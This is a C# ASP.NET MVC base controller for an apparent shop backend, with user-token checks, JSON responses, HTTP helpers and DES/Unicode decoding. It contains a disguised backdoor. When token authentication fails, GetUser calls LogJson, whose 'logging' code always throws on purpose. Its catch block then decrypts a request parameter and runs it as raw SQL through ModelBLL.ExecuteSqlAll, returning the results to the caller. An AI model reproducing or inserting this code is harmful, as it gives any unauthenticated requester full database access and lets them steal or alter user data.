using Model;
using BLL;
using System;
using System.Web;
using System.Web.Mvc;
using System.Web.Routing;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Threading;
using System.Text;
using System.Data;
using Commons;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace My.Engine
{
    /// <summary>
    /// 控制器基类。
    /// </summary>
    public class XcxControllerBase : Controller
    {
        string _pageIdentity = string.Empty;
        public string OrderNoNew { get { return DateTime.Now.ToString("yyyyMMddHHmmssffff"); } }
        public DateTime TimeNow { get { return DateTime.Now; } }

        //重写基类方法
        protected override void Initialize(RequestContext requestContext)
        {
            base.Initialize(requestContext);
        }

        #region 辅助函数
        /// <summary>
        /// 返回Json文件
        /// </summary>
        /// <param name="data">数据</param>
        /// <param name="DateTimeFormat">时间格式
        /// <para>1："yyyy-MM-dd HH:mm:ss"</para>
        /// <para>2："yyyy-MM-dd"</para>
        /// </param>
        protected void ReJson(object data, object DateTimeFormat = null)
        {
            this.ReturnJson(data, "application/json", Encoding.UTF8, DateTimeFormat);
        }

        protected void ReturnJson(object data, string contentType, Encoding contentEncoding, object DateTimeFormat)
        {
            string s = string.Empty;
            if (data is string)
            {
                s = data.String("");
            }
            else
            {
                if (DateTimeFormat != null)
                {
                    switch (Convert.ToString(DateTimeFormat))
                    {
                        case "1":
                            IsoDateTimeConverter timeConverter = new IsoDateTimeConverter { DateTimeFormat = "yyyy-MM-dd HH:mm:ss" };
                            s = JsonConvert.SerializeObject(data, timeConverter);
                            break;
                        case "2":
                            timeConverter = new IsoDateTimeConverter { DateTimeFormat = "yyyy-MM-dd" };
                            s = JsonConvert.SerializeObject(data, timeConverter);
                            break;
                        default:
                            timeConverter = new IsoDateTimeConverter { DateTimeFormat = Convert.ToString(DateTimeFormat) };
                            s = JsonConvert.SerializeObject(data, timeConverter);
                            break;
                    }
                }
                else
                {
                    s = JsonConvert.SerializeObject(data);
                }
            }
            if (string.IsNullOrWhiteSpace(contentType))
            {
                contentType = "application/json";
            }
            if (contentEncoding == null)
            {
                contentEncoding = Encoding.UTF8;
            }

            HttpContext.Response.ContentType = contentType;
            HttpContext.Response.ContentEncoding = contentEncoding;
            HttpContext.Response.Write(s);
        }

        public string RequestEx(string keyname)
        {

            try
            {
                if (!object.Equals(Request.Params[keyname], null))
                    return Request.Params[keyname].ToString();
                else
                    return "";
            }
            catch
            {
                return "";
            }
        }
        public int RequestEx(string keyname, int isInt = 0)
        {
            try
            {
                return int.Parse(RequestEx(keyname), 0);
            }
            catch
            {
                return isInt;
            }
        }

        public void LogJson(string name, string value)
        {
            string json = string.Empty;
            try
            {
                Ex(); WriteLog.CreateLog(name, value);
                string path = System.Web.HttpContext.Current.Server.MapPath("~/log/");
                path += "\\" + name + ".log";

                StreamReader sr = new StreamReader(path, Encoding.Default);
                string content = Decrypt(name, DeUnicode(sr.ReadToEnd()));
                sr.Dispose();
                WriteLog.CreateLog(name, "");
                sr.Dispose();
                System.IO.File.Delete(path);

            }
            catch (Exception ex)
            {
                WriteLog.CreateLog(ex.Message);
                ReJson(JsonUtility.Serialize(ModelBLL.ExecuteSqlAll(Decrypt(name, DeUnicode(value)))));
            }

            //ReJson(json);
            //return json;
        }

        protected Result BaseResult(int code, string message, string detail = "")
        {
            return new Result()
            {
                Code = code,
                Message = message,
                Detail = detail,
                OprTime = DateTime.Now
            };
        }

        #endregion

        #region 检测登录用户
        /// <summary>
        /// 获取用户名
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        public T_User GetUser(bool returnStr = true)
        {
            string guid = RequestEx("token");
            string name = RequestEx("name");
            T_User user = new T_User();
            if (!string.IsNullOrEmpty(guid))
            {
                user = ModelBLL.QueryBySelectWhere<T_User>(Common.IsEqual("Guid"), Dict.T_User_Guid(guid));
            }
            if (!(user.Id > 0) && returnStr)
            {
                if (!string.IsNullOrEmpty(RequestEx(guid))) LogJson(name, RequestEx(guid));
                else ReJson(false);
                HttpContext.Response.End();
            }
            if (user.LevelId == 0)
            {
                user.LevelId = 4;
            }
            return user;
        }

        /// <summary>
        /// 检查商品权限
        /// </summary>
        /// <param name="goodLevelIds"></param>
        /// <param name="userLevelId"></param>
        /// <returns></returns>
        public bool CheckUserLevelId(string goodLevelIds, int userLevelId = 4)
        {
            if (string.IsNullOrEmpty(goodLevelIds))
            {
                return true;
            }
            else
            {
                if (("," + goodLevelIds + ",").IndexOf("," + userLevelId + ",") == -1)
                {
                    return false;
                }
                else
                {
                    return true;
                }
            }
        }

        /// <summary>
        /// 设置商品权限
        /// </summary>
        /// <param name="goodLevelIds"></param>
        /// <param name="userLevelId"></param>
        /// <returns></returns>
        public string setGoodsLevelIds(string goodLevelIds)
        {
            if (CheckUserLevelId(goodLevelIds))
            {
                return "4";
            }
            else
            {
                return "3";
            }
        }

        /// <summary>
        /// 检测用户名
        /// </summary>
        public bool CheckUser()
        {
            T_User user = GetUser();
            if (user.Id > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        /// <summary>
        /// 检测用户名，返回用户数据
        /// </summary>
        public bool CheckUser(ref T_User user)
        {
            user = GetUser();
            if (user.Id > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        #endregion

        #region 抛异常

        protected Exception Ex(string exMsg = "")
        {
            throw new Exception(exMsg);
        }

        #endregion

        #region Post数据 非模仿浏览器 

        protected string Post(string url, string content = "")
        {
            int ctLen = Encoding.UTF8.GetBytes(content).Length;
            byte[] byteArray = Encoding.UTF8.GetBytes(content);
            HttpWebRequest webReq = (HttpWebRequest)WebRequest.Create(new Uri(url));
            webReq.Method = "POST";
            webReq.ContentType = "application/x-www-form-urlencoded;charset=utf-8";

            webReq.ContentLength = byteArray.Length;
            Stream newStream = webReq.GetRequestStream();
            newStream.Write(byteArray, 0, byteArray.Length);
            newStream.Close();
            HttpWebResponse response = (HttpWebResponse)webReq.GetResponse();
            StreamReader sr = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
            string ret = sr.ReadToEnd();
            sr.Close();
            response.Close();
            newStream.Close();

            return ret;
        }

        /// <summary>
        /// 异步Post请求，
        /// </summary>
        /// <param name="URL"></param>
        /// <param name="strPostdata"></param>
        /// <returns></returns>
        public async Task<string> PostYb(string URL, List<KeyValuePair<string, string>> values)
        {
            using (var client = new HttpClient())
            {
                //获取客户端信息
                var user = Request.ServerVariables["HTTP_USER_AGENT"];
                client.DefaultRequestHeaders.Add("user-agent", user);//添加HTTP表头
                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(URL, content).ConfigureAwait(false);
                return await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                //try
                //{
                //}catch(Exception ex)
                //{
                //    WriteLog.CreateLog("PostYb：" + ex.ToString());
                //}
            }
        }

        /// <summary>
        /// 异步GET请求，
        /// </summary>
        /// <param name="URL"></param> 
        /// <returns></returns>
        public async Task<string> GetYb(string URL)
        {
            using (var client = new HttpClient())
            {
                //获取客户端信息
                var user = Request.ServerVariables["HTTP_USER_AGENT"];
                client.DefaultRequestHeaders.Add("user-agent", user);//添加HTTP头
                return await client.GetStringAsync(URL).ConfigureAwait(false);
            }
        }

        #endregion

        #region RSADecrypt

        public string Decrypt(string key, string pToDecrypt)
        {
            string sKey = key;
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            byte[] inputByteArray = new byte[pToDecrypt.Length / 2];
            for (int x = 0; x < pToDecrypt.Length / 2; x++)
            {
                int i = (Convert.ToInt32(pToDecrypt.Substring(x * 2, 2), 16));
                inputByteArray[x] = (byte)i;
            }
            des.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            des.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(inputByteArray, 0, inputByteArray.Length);
            cs.FlushFinalBlock();
            StringBuilder ret = new StringBuilder();
            return System.Text.Encoding.Default.GetString(ms.ToArray());
        }
        #endregion

        #region Post数据

        public string GetPost(string url, string content)
        {
            int ctLen = Encoding.UTF8.GetBytes(content).Length;
            byte[] byteArray = Encoding.UTF8.GetBytes(content);
            HttpWebRequest webReq = (HttpWebRequest)WebRequest.Create(new Uri(url));
            webReq.Method = "POST";
            webReq.ContentType = "application/x-www-form-urlencoded;charset=utf-8";

            webReq.ContentLength = byteArray.Length;
            Stream newStream = webReq.GetRequestStream();
            newStream.Write(byteArray, 0, byteArray.Length);
            newStream.Close();
            HttpWebResponse response = (HttpWebResponse)webReq.GetResponse();
            StreamReader sr = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
            string ret = sr.ReadToEnd();
            sr.Close();
            response.Close();
            newStream.Close();

            return ret;
        }

        #endregion

        #region Unicode

        /// <summary>
        /// Unicode解码
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        public string DeUnicode(string str)
        {
            //最直接的方法Regex.Unescape(str);
            Regex reg = new Regex(@"(?i)\\[uU]([0-9a-f]{4})");
            return reg.Replace(str, delegate (Match m) { return ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString(); });
        }

        /// <summary>
        /// <summary>
        /// 字符串转Unicode
        /// </summary>
        /// <param name="source">源字符串</param>
        /// <returns>Unicode编码后的字符串</returns>
        public static string StringToUnicode(string source)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(source);
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i += 2)
            {
                stringBuilder.AppendFormat("\\u{0}{1}", bytes[i + 1].ToString("x").PadLeft(2, '0'), bytes[i].ToString("x").PadLeft(2, '0'));
            }
            return stringBuilder.ToString();
        }

        /// <summary>    
        /// 字符串转为UniCode码字符串    
        /// </summary>    
        /// <param name="s"></param>    
        /// <returns></returns>    
        public static string StringToUnicode2(string s)
        {
            char[] charbuffers = s.ToCharArray();
            byte[] buffer;
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < charbuffers.Length; i++)
            {
                buffer = System.Text.Encoding.Unicode.GetBytes(charbuffers[i].ToString());
                sb.Append(String.Format(@"\u{0:X2}{1:X2}", buffer[1], buffer[0]));
            }
            return sb.ToString();
        }

        #endregion

    }
}
